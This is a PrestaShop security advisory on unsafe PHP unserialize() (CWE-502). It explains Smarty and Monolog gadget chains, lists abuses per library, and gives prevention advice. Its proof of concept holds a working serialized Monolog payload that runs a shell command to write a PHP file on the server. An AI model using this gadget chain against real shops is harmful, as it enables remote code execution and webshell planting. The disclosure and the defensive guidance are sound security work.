---
layout: post
title: "[CWE-502] Exploring the perils of unsafe deserialize() in PrestaShop (part 1)"
categories: research
author:
- 202-ecommerce.com
- TouchWeb.fr
- Friends-Of-Presta.org
meta: "CVE,PrestaShop,CWE-502"
severity: "critical (10)"
---

The deserialization of instantiated objects in PHP involved the trigger of the magic methods `__construct()`, `__wakeup()` and `__destruct()`. 

A Smarty, Monolog or Symfony library's [Gadget](https://en.wikipedia.org/wiki/Gadget_(computer_science)) hydratation with a malicious payload followed by its deserialization can be exploited in multiple malicious critical usages.

Until this present research, we did not have any known gadget on our ecosystem that can justify a CVE against `unserialize` usage.

## Summary

* **Published at**: 2023-08-28
* **Platform**: All CMS especially PrestaShop.
* **Weakness**: [CWE-502](https://cwe.mitre.org/data/definitions/502.html)
* **Severity**: critical (10)

## Unsafe PHP method deserialize() (part 1)

### How it works?

Let's take an example. The `Smarty` template engine cache process is scheduled to create a lock file at the beginning and remove it at the end during the destruct of `Smarty`'s object. 

A Gadget of this object, a sort of "mockup" of the original class, can be crafted with a target file as parameter. Then, it will remove the target during the deserialization of the Gadget. `Smarty` cache class can be hijacked to delete any files of the vulnerable application.

Please read this article to know more about [unsafe unserialize() in PHP](https://www.sjoerdlangkemper.nl/2021/04/04/remote-code-execution-through-unsafe-unserialize/).


### Proof of concept

Similarly, the popular library `Monolog` can be hijacked to execute remote code. Let’s explain it in a POC.

We created a simple module to demontrate the danger of a deserialization. Please note that any php script that include PrestaShop core file `config/config.inc.php` load vendors libraries and consequently `Monolog` (PS 1.7+) or others libraries.

**FOR EDUCATIONAL PURPOSES ONLY. DO NOT USE THIS SCRIPT FOR ILLEGAL ACTIVITIES. THE AUTHOR IS NOT RESPONSIBLE FOR ANY MISUSE OR DAMAGE.**

1. Create a module

```php
// modules/mymodule/mymodule.php

class Mymodule
{
...
    public function getContent()
    {
        $payload = 'O:37:"Monolog\Handler\FingersCrossedHandler":3:{s:13:"passthruLevel";i:0;s:6:"buffer";a:1:{s:4:"test";a:2:{i:0;s:45:"echo \'<?php echo "♥" . (25-125);\' > ./a.php";s:5:"level";N;}}s:7:"handler";O:29:"Monolog\Handler\BufferHandler":7:{s:7:"handler";N;s:10:"bufferSize";i:-1;s:6:"buffer";N;s:5:"level";N;s:11:"initialized";b:1;s:11:"bufferLimit";i:-1;s:10:"processors";a:2:{i:0;s:7:"current";i:1;s:6:"system";}}}';

        $unsafeDeserialization = unserialize($payload);

        return var_dump($unsafeDeserialization, true);
    }
...
```

2. Go to the configuration page of the module.

3. This piece of code will put an `a.php` file in the designated directory of PrestaShop.


### Malicious usage through PrestaShop dependencies

Malicious usages of PrestaShop via common libraries are:
* remote code execution (RCE) to put a webshell
* Server Side Request Forgery (SSRF) to aggress other website with a clean IP
* File Deletion (FD) to remove an htaccess and expose logs or sensitive data
* File Writer (WF) to put a webshell
* Files read reader (RF) to read sensitive data like mysql password
* SQL injections (SQLi)
* Technical data leaks (Info)

|PrestaShop dependency|Malicious usage|
| ------|-----|
|Smarty|SSRF and FD|
|Monolog|RCE and FW|
|Symfony|FD, FW, and RCE|
|Doctrine|RCE and FW|
|TCPDF|FD|
|Guzzle|FW, Info and RCE|

Source: [PHP Generic Gadget Chains](https://github.com/ambionics/phpggc/tree/master/gadgetchains)

NB 1: This list is not exhaustive. Module dependencies can also include other hijackable classes.

NB 2: Several PrestaShop core or modules configurations are stored in database as serialized strings. In chain, a SQL injection can also be exploited to inject malicious serialized string that will be triggered during the deserialization.


### How to prevent this vulnerability?

As you understand, `unserialize($_GET['param'])` (or `$_POST`, `$_COOKIE`, ...), each **untrusted data unserialized is a critical vulnerability**. 

* A strict validation of input data is absolutely essential!
* Use json serialization instead as soon as possible : `json_encode` and `json_decode`
* Disable the deserialization of classes via `unserialize($args, ['allowed_classes' => false])`. That's not perfect but better than nothing.


